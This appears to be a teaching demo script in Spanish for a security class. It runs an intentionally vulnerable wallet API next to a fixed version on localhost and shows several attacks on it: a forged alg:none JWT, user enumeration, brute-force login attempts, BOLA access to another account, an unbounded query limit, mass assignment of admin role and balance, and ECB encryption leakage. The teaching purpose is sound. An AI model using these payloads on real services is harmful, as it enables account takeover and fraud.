#!/usr/bin/env bash
# Demo de la sesión 3: autenticación, APIs y criptografía en la Billetera UCP.
# Insegura en :5005, solución en :5006 (solo 127.0.0.1). Uso: bash demos/sesion-3/02-billetera/demo-billetera.sh
set -u
cd "$(dirname "$0")" || exit 1
[ -f .soluciones/app.py ] || { echo "Falta .soluciones/app.py (solo en el equipo del docente)"; exit 1; }
DC="docker compose -f docker-compose.yml"
INS=http://127.0.0.1:5005
SEG=http://127.0.0.1:5006
pausa() { printf '\n\033[1;33m>> %s\033[0m\n' "$1"; read -r -p "   [Enter para continuar] " _; }
etq()   { printf '   \033[1m%-9s\033[0m' "$1"; }
corto() { tr -s '\n ' ' ' | head -c "${1:-160}"; echo; }
login() { curl -s -X POST "$1/api/login" -H 'Content-Type: application/json' -d "{\"usuario\":\"$2\",\"clave\":\"$3\"}"; }
token() { login "$1" "$2" "$3" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("token",""))'; }
ambos() { for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura; "$@" "$u"; done; }

pausa "0. Levantar la billetera: insegura en :5005 y segura en :5006"
$DC up -d --build --quiet-pull 2>&1 | grep -vE '^\s*$' | tail -2
for _ in $(seq 30); do curl -sf $INS/salud >/dev/null && curl -sf $SEG/salud >/dev/null && break; sleep 1; done
$DC ps --format 'table {{.Service}}\t{{.Ports}}'
TI=$(token $INS ana Cafetal-de-Risaralda-2026); TS=$(token $SEG ana Cafetal-de-Risaralda-2026)

pausa "V9 · JWT. Lo que trae el token de Ana (un JWT no está cifrado: es base64)"
for t in "$TI" "$TS"; do [ "$t" = "$TI" ] && etq Insegura || etq Segura
  python3 -c 'import base64,sys; p=sys.argv[1].split(".")[1]; print(base64.urlsafe_b64decode(p+"="*(-len(p)%4)).decode())' "$t"; done
pausa "   Fabricamos un token de «admin» sin firma (alg: none)"
FALSO=$(python3 -c 'import base64,json
b=lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"admin"})+".")')
echo "   $FALSO"
ambos sh -c 'curl -s -o /dev/null -w "%{http_code}  " "$0/api/perfil" -H "Authorization: Bearer '"$FALSO"'"; curl -s "$0/api/perfil" -H "Authorization: Bearer '"$FALSO"'" | head -c 120; echo'
echo "   Control: verificar firma con algorithms=[\"HS256\"], exp de 15 min, iss y aud obligatorios."

pausa "V6 · ENUMERACIÓN. Usuario que no existe contra clave equivocada"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  echo "$(login $u nadie x | corto 60) | $(login $u ana x | corto 60)"; done
pausa "   FUERZA BRUTA: 6 intentos seguidos contra beto"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  for i in 1 2 3 4 5 6; do printf '%s ' "$(curl -s -o /dev/null -w '%{http_code}' -X POST $u/api/login -H 'Content-Type: application/json' -d '{"usuario":"beto","clave":"adivinando'$i'"}')"; done; echo; done

pausa "V6 · CONTRASEÑAS. El perfil inseguro entrega el hash; ¿cuánto cuesta probar claves?"
etq Insegura; curl -s $INS/api/perfil -H "Authorization: Bearer $TI" | python3 -c 'import json,sys; d=json.load(sys.stdin); print("hash_clave =", d.get("hash_clave"))'
docker run --rm --network none ucp-billetera python -c '
import hashlib, time
from argon2 import PasswordHasher
t=time.time(); n=0
while time.time()-t < 1: hashlib.md5(b"intento%d" % n).hexdigest(); n+=1
ph=PasswordHasher(); t=time.time(); m=0
while time.time()-t < 1: ph.hash("intento"); m+=1
print(f"   MD5:      {n:>11,} intentos por segundo en un núcleo".replace(",", "."))
print(f"   Argon2id: {m:>11,} intentos por segundo (64 MiB de memoria cada uno)".replace(",", "."))'

pausa "API1 · BOLA. Ana pide los movimientos de la cuenta 2 (de Beto)"
etq Insegura; curl -s $INS/api/cuentas/2/movimientos -H "Authorization: Bearer $TI" | corto
etq Segura;   curl -s $SEG/api/cuentas/2/movimientos -H "Authorization: Bearer $TS" | corto

pausa "API4 · RECURSOS. limite=-1 (en SQLite: sin límite)"
etq Insegura; curl -s "$INS/api/cuentas/1/movimientos?limite=-1" -H "Authorization: Bearer $TI" | python3 -c 'import json,sys; print(len(json.load(sys.stdin)), "movimientos en una sola respuesta")'
etq Segura;   curl -s "$SEG/api/cuentas/1/movimientos?limite=-1" -H "Authorization: Bearer $TS" | corto

pausa "API3 · ASIGNACIÓN MASIVA. Ana envía {\"rol\": \"admin\", \"saldo\": 999999999}"
for u in $INS $SEG; do [ $u = $INS ] && { etq Insegura; t=$TI; } || { etq Segura; t=$TS; }
  curl -s -X PATCH $u/api/perfil -H "Authorization: Bearer $t" -H 'Content-Type: application/json' \
    -d '{"rol":"admin","saldo":999999999}' | corto 200; done

pausa "V11 · CIFRADO. Dos usuarios con el mismo documento: ¿se nota en la base de datos?"
for u in $INS $SEG; do [ $u = $INS ] && etq Insegura || etq Segura
  for n in carla dario; do curl -s -o /dev/null -X POST $u/api/registro -H 'Content-Type: application/json' \
    -d "{\"usuario\":\"$n\",\"clave\":\"una frase larga de prueba\",\"documento\":\"1088999111\"}"; done
  c=$([ $u = $INS ] && echo insegura || echo segura)
  $DC exec -T $c python -c 'import sqlite3; [print(r[0], r[1][:44], end="   ") for r in sqlite3.connect("/tmp/billetera.db").execute("SELECT usuario, documento FROM usuarios WHERE usuario IN (\"carla\",\"dario\")")]'; echo; done
echo "   ECB: mismo dato, mismo cifrado (y la llave está en el código). AES-GCM: nonce aleatorio y etiqueta de autenticación."

pausa "Fin. Bajar los contenedores"
$DC down
